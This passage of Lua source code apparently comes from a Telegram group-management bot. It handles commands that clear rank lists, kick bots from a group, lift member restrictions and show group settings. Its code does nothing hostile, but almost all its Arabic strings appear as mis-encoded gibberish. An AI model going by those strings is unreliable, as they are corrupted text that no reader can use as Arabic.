local Text = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ’ΩΩΨΉΨΆΩΩΩΩ (.*)$") 
Devmfm:set(mustafa.."mfm:mem:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ’ΩΩΨΉΨΆΩΩΩΩ Ψ§ΩΩ β "..Text, 1, 'md')
end
if text == "Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΨ±ΨͺΨ¨" or text == "ΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΨ±ΨͺΨ¨" then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ±Ψ―ΩΨ― Ψ§ΩΨ±ΨͺΨ¨", 1, 'md')
Devmfm:del(mustafa.."mfm:mem:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:Cleaner:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:VipMem:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:Admins:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:Managers:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:Constructor:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:BasicConstructor:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source Escobar     --
if text == "ΩΨ΄Ω Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ" and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = 'β β« *ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ¨ΩΩΨͺΨ’Ψͺ* β β₯‘ \nββββ EB ββββ\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' β―'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΩΨ¬Ψ― Ψ¨ΩΩΨͺΨ’Ψͺ ΩΩΩΨ’*", 1, 'md')
return false end
if #admins == i then 
local a = 'ββββ EB ββββ\nβ β« *ΨΉΨ―Ψ― Ψ’ΩΨ¨ΩΩΨͺΨ’Ψͺ ΩΩΩΨ’* β '..n..'\n'
local f = 'β β« *ΨΉΨ―Ψ― Ψ’ΩΨ¨ΩΩΨͺΨ’Ψͺ Ψ§ΩΩΨ±ΩΩΨΉΩ* β '..t..'\nβ β« *ΩΩΨ§Ψ­ΨΆΩ ΨΉΩΨ§ΩΨ© Ψ§ΩΩ*β― *ΨͺΨΉΩΩ Ψ§Ω Ψ§ΩΨ¨ΩΨͺ Ψ§Ψ―ΩΩ ΩΩΩΩ° ΩΨ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*'
Dev_mfm(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'Ψ­Ψ°Ω Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ' and ChCheck(msg) or text == 'Ψ·Ψ±Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ' and ChCheck(msg) or text == 'ΩΨ³Ψ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(mustafa) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΩΨ¬Ψ― Ψ¨ΩΨͺΨ§Ψͺ ΩΩΩΨ’*", 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ ΩΩΩΨ’* β "..c.."\nβ β« *ΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ§ΩΩΨ±ΩΩΨΉΩ* β "..x.."\nβ β« *ΨͺΩΩΩΩ Ψ·Ψ±Ψ―* β "..(c - x).." *ΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ*", 1, 'md')
end 
end,nil)  
end 
--     Source Escobar     --
end
--     Source Escobar     --
if Admin(msg) then
if text and text:match("^Ψ­Ψ°Ω (.*)$") or text and text:match("^ΩΨ³Ψ­ (.*)$") then
local txts = {string.match(text, "^(Ψ­Ψ°Ω) (.*)$")}
local txtss = {string.match(text, "^(ΩΨ³Ψ­) (.*)$")}
if Sudo(msg) then 
if txts[2] == 'Ψ§ΩΨ«Ψ§ΩΩΩΩΩ' or txtss[2] == 'Ψ§ΩΨ«Ψ§ΩΩΩΩΩ' or txts[2] == 'Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ' or txtss[2] == 'Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ' then
Devmfm:del(mustafa..'mfm:SecondSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ Ψ§έͺΨ«ΩΨ£ΩΩΩ°ΩΩΩ*")  
end
end
if SecondSudo(msg) then 
if txts[2] == 'Ψ§ΩΩΨ·ΩΨ±ΩΩ' or txtss[2] == 'Ψ§ΩΩΨ·ΩΨ±ΩΩ' then
Devmfm:del(mustafa..'mfm:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ*")  
end
if txts[2] == 'ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω' or txtss[2] == 'ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω' then
Devmfm:del(mustafa..'mfm:BanAll:')
Devmfm:del(mustafa..'mfm:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨΉΩΨ’Ω*")  
end
end
if SudoBot(msg) then
if txts[2] == 'Ψ§ΩΨ§Ψ―ΩΩΩΩ Ψ§ΩΨΉΨ§ΩΩΩ' or txts[2] == 'Ψ§ΩΨ§Ψ―ΩΩΩΩ Ψ§ΩΨΉΨ§Ω' or txtss[2] == 'Ψ§ΩΨ§Ψ―ΩΩΩΩ Ψ§ΩΨΉΨ§ΩΩΩ' or txtss[2] == 'Ψ§ΩΨ§Ψ―ΩΩΩΩ Ψ§ΩΨΉΨ§Ω' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΨ’ΪΩΩΩΩΩΫ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
Devmfm:del(mustafa..'mfm:AdminAll:')
end
if txts[2] == 'Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω' or txts[2] == 'Ψ§ΩΩΩΩΨ²ΩΩ Ψ§ΩΨΉΨ§ΩΩΩ' or txtss[2] == 'Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω' or txtss[2] == 'Ψ§ΩΩΩΩΨ²ΩΩ Ψ§ΩΨΉΨ§ΩΩΩ' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ ΨΉΩΨ’Ω*")  
Devmfm:del(mustafa..'mfm:VipAll:')
end
if txts[2] == 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ Ψ§ΩΨΉΨ§ΩΩΩ' or txts[2] == 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ Ψ§ΩΨΉΨ§Ω' or txtss[2] == 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ Ψ§ΩΨΉΨ§ΩΩΩ' or txtss[2] == 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ Ψ§ΩΨΉΨ§Ω' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
Devmfm:del(mustafa..'mfm:ManagerAll:')
end
end
if mfmConstructor(msg) then
if txts[2] == 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ' or txtss[2] == 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω Ψ’ΩΨ’Ψ³Ψ’Ψ³ΩΩΩ*")  
Devmfm:del(mustafa..'mfm:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ' or txtss[2] == 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω*")  
Devmfm:del(mustafa..'mfm:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘' or txtss[2] == 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½*")  
Devmfm:del(mustafa..'mfm:Managers:'..msg.chat_id_)
end 
if txts[2] == 'Ψ§ΩΩΩΨΈΩΩΩ' or txtss[2] == 'Ψ§ΩΩΩΨΆΩΩΩ' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ§ΩΩΩΨΈΩΩΩΩ°Ω*")  
Devmfm:del(mustafa..'mfm:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'Ψ§ΩΨ§Ψ―ΩΩΩΩ' or txtss[2] == 'Ψ§ΩΨ§Ψ―ΩΩΩΩ' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΨ’ΪΩΩΩΩΩΫ*")  
Devmfm:del(mustafa..'mfm:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'Ψ§ΩΩΨ·Ψ§ΩΩ' or txtss[2] == 'Ψ§ΩΩΨ·Ψ§ΩΩ' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΨ·Ψ’ΩΩ°ΩΩ*")  
Devmfm:del(mustafa..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'Ψ§ΩΨ±Ψ§Ψ¨Ψ·' or txtss[2] == 'Ψ§ΩΨ±Ψ§Ψ¨Ψ·' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
Devmfm:del(mustafa.."mfm:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'Ψ§ΩΩΩΩΨ²ΩΩ' or txtss[2] == 'Ψ§ΩΩΩΩΨ²ΩΩ' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ*")  
Devmfm:del(mustafa..'mfm:VipMem:'..msg.chat_id_)
end
if txts[2] == 'Ψ§ΩΩΩΨͺΩΩΩΩ' or txtss[2] == 'Ψ§ΩΩΩΨͺΩΩΩΩ' then
Devmfm:del(mustafa..'mfm:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ’ΩΩΩΪͺΨͺΩΩΩΩΩ°Ω*")  
end
if txts[2] == 'Ψ§ΩΩΩΩΨ―ΩΩ' or txtss[2] == 'Ψ§ΩΩΩΩΨ―ΩΩ' then     
local List = Devmfm:smembers(mustafa..'mfm:Tkeed:'..msg.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ Ψ§ΩΩΩΩΨ―ΩΩ*")  
end
if txts[2] == 'ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ' or txtss[2] == 'ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΨΉ*")  
Devmfm:del(mustafa..'mfm:Filters:'..msg.chat_id_)
end
if txts[2] == 'ΩΩΨ§Ψ¦Ω Ψ§ΩΩΩΨΉ' or txtss[2] == 'ΩΩΨ§Ψ¦Ω Ψ§ΩΩΩΨΉ' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ ΩΩΨ§Ψ¦Ω Ψ§ΩΩΩΨΉ*")  
Devmfm:del(mustafa..'mfm:Filters:'..msg.chat_id_)
Devmfm:del(mustafa.."mfm:FilterAnimation"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:FilterPhoto"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ' or txtss[2] == 'ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ' then     
Devmfm:del(mustafa.."mfm:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ*")  
end
if txts[2] == 'ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±' or txtss[2] == 'ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±' then     
Devmfm:del(mustafa.."mfm:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±*")  
end
if txts[2] == 'ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ' or txtss[2] == 'ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ' then     
Devmfm:del(mustafa.."mfm:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­ΩΨ°ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ ΩΩΨΉ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ*")  
end
end
end
--     Source Escobar     --
if text and text:match("^Ψ­Ψ°Ω Ψ§ΩΩΩΨ§Ψ¦Ω$") and ChCheck(msg) or text and text:match("^ΩΨ³Ψ­ Ψ§ΩΩΩΨ§Ψ¦Ω$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ·', 1, 'md')
else
Devmfm:del(mustafa..'mfm:Ban:'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Admins:'..msg.chat_id_) Devmfm:del(mustafa..'User:Donky:'..msg.chat_id_) Devmfm:del(mustafa..'mfm:VipMem:'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Filters:'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Muted:'..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω β β¨ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΨΉ β’ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ β’ Ψ§ΩΩΩΨͺΩΩΩΩ β’ Ψ§ΩΨ§Ψ―ΩΩΩΩ β’ Ψ§ΩΩΩΩΨ²ΩΩ β’ Ψ§ΩΩΨ·Ψ§ΩΩ β© Ψ¨ΩΨ¬Ψ§Ψ­ *\n β", 1, 'md')
end end
--     Source Escobar     --
if text and text:match("^Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ§ΩΨ±ΨͺΨ¨$") and ChCheck(msg) or text and text:match("^ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ±ΨͺΨ¨$") and ChCheck(msg) or text and text:match("^ΨͺΩΨ²ΩΩ Ψ¬ΩΩΨΉ Ψ§ΩΨ±ΨͺΨ¨$") and ChCheck(msg) then
if not mfmConstructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ΄Ψ¦ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ΩΩΨ·', 1, 'md')
else
local basicconstructor = Devmfm:smembers(mustafa..'mfm:BasicConstructor:'..msg.chat_id_)
local constructor = Devmfm:smembers(mustafa..'mfm:Constructor:'..msg.chat_id_)
local Managers = Devmfm:smembers(mustafa..'mfm:Managers:'..msg.chat_id_)
local admins = Devmfm:smembers(mustafa..'mfm:Admins:'..msg.chat_id_)
local vipmem = Devmfm:smembers(mustafa..'mfm:VipMem:'..msg.chat_id_)
local donky = Devmfm:smembers(mustafa..'User:Donky:'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ β’ ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ β’ ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ β’ ' else Managerst = '' end
if #admins ~= 0 then adminst = 'Ψ§ΩΨ§Ψ―ΩΩΩΩ β’ ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'Ψ§ΩΩΩΩΨ²ΩΩ β’ ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'Ψ§ΩΩΨ·Ψ§ΩΩ β’ ' else donkyt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
Devmfm:del(mustafa..'mfm:BasicConstructor:'..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Constructor:'..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Managers:'..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Admins:'..msg.chat_id_)
Devmfm:del(mustafa..'mfm:VipMem:'..msg.chat_id_)
Devmfm:del(mustafa..'User:Donky:'..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨͺΨ§ΩΩΩ β * β¨ "..basicconstructort..''..constructort..''..Managerst..''..adminst..''..vipmemt..''..donkyt.." β© Ψ¨ΩΨ¬Ψ§Ψ­ \n β", 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΩΨ§ΨͺΩΨ¬Ψ― Ψ±ΨͺΨ¨ ΩΩΩΨ’*", 1, 'md')
end 
end 
end
--     Source Escobar     --
if Admin(msg) then 
if text and text:match("^Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ$") and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = Devmfm:get(mustafa..'mfm:Spam:Text'..msg.chat_id_)
end
--     Source Escobar     --
if Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"     
elseif Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "Ψ¨Ψ§ΩΨͺΩΩΨ―"     
elseif Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "Ψ¨Ψ§ΩΩΨͺΩ"           
elseif Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "Ψ¨Ψ§ΩΨ­Ψ°Ω"
else     
flood = "ΩΩΨͺΩΨ­"     
end
--     Source Escobar     --
if Devmfm:get(mustafa.."mfm:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "Ψ¨Ψ§ΩΨ­Ψ°Ω"
elseif Devmfm:get(mustafa.."mfm:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "Ψ¨Ψ§ΩΨͺΩΩΨ―"   
elseif Devmfm:get(mustafa.."mfm:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_bots = "ΩΩΨͺΩΨ­Ω"    
end
--     Source Escobar     --
if Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then mute_text = 'ΩΩΩΩΩ' else mute_text = 'ΩΩΨͺΩΨ­Ω'end
if Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then mute_photo = 'ΩΩΩΩΩ' else mute_photo = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then mute_video = 'ΩΩΩΩΩ' else mute_video = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'ΩΩΩΩΩ' else mute_gifs = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then mute_music = 'ΩΩΩΩΩ' else mute_music = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then mute_in = 'ΩΩΩΩΩ' else mute_in = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then mute_voice = 'ΩΩΩΩΩ' else mute_voice = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'ΩΩΩΩΩ' else mute_edit = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then mute_links = 'ΩΩΩΩΩ' else mute_links = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then lock_pin = 'ΩΩΩΩΩ' else lock_pin = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'ΩΩΩΩΩ' else lock_sticker = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'ΩΩΩΩΩ' else lock_tgservice = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'ΩΩΩΩΩ' else lock_wp = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'ΩΩΩΩΩ' else lock_htag = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then lock_tag = 'ΩΩΩΩΩ' else lock_tag = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then lock_location = 'ΩΩΩΩΩ' else lock_location = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then lock_contact = 'ΩΩΩΩΩ' else lock_contact = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then lock_english = 'ΩΩΩΩΩ' else lock_english = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'ΩΩΩΩΩ' else lock_arabic = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then lock_forward = 'ΩΩΩΩΩ' else lock_forward = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Document'..msg.chat_id_) then lock_file = 'ΩΩΩΩΩ' else lock_file = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then markdown = 'ΩΩΩΩΩ' else markdown = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) then lock_spam = 'ΩΩΩΩΩ' else lock_spam = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Join'..msg.chat_id_) then lock_Join = 'ΩΩΩΩ' else lock_Join = 'ΩΩΨͺΩΨ­' end
if Devmfm:get(mustafa.."mfm:Lock:Welcome"..msg.chat_id_) then send_welcome = 'ΩΩΩΩΩ' else send_welcome = 'ΩΩΨͺΩΨ­Ω' end
if Devmfm:get(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'ΩΩΨͺΩΨ­' else lock_fshar = 'ΩΩΩΩ' end
if Devmfm:get(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'ΩΩΨͺΩΨ­' else lock_kaf = 'ΩΩΩΩ' end
if Devmfm:get(mustafa..'mfm:Lock:Taf'..msg.chat_id_) then lock_taf = 'ΩΩΨͺΩΨ­Ω' else lock_taf = 'ΩΩΩΩΩ' end
if Devmfm:get(mustafa..'mfm:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'ΩΩΩΩΩ' else lock_farsi = 'ΩΩΨͺΩΨ­Ω' end
local Flood_Num = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source Escobar     --
local TXTE = "*β β« Ψ’ΨΉΩΪΨ’ΪΨ’Ψͺ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘ *\nββββ EB ββββ\n"
.."*β β« Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· β * "..mute_links.."\n"
.."*β β« Ψ§ΩΩΨΉΨ±Ω β* "..lock_tag.."\n"
